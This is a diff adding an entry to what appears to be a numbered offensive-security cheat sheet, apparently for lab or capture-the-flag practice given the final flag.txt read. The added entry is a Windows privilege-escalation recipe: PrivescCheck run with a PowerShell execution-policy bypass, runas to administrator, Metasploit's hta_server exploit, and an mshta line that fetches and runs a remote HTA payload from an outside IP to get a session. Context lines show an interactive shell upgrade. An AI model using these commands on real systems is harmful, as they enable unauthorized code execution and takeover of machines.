@@ -2045,4 +2045,21 @@ exploit
 /bin/bash -i
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
-107)
+107) Windows: PrivescCheck
+```
+whoami
+https://github.com/itm4n/PrivescCheck
+cd C:\Users\student\Desktop\PrivescCheck
+ls
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck
+runas.exe /user:administrator cmd
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
+sessions -i 1
+cd C:\\Users\\Administrator\\Desktop
+dir
+cat flag.txt
+```
+108)
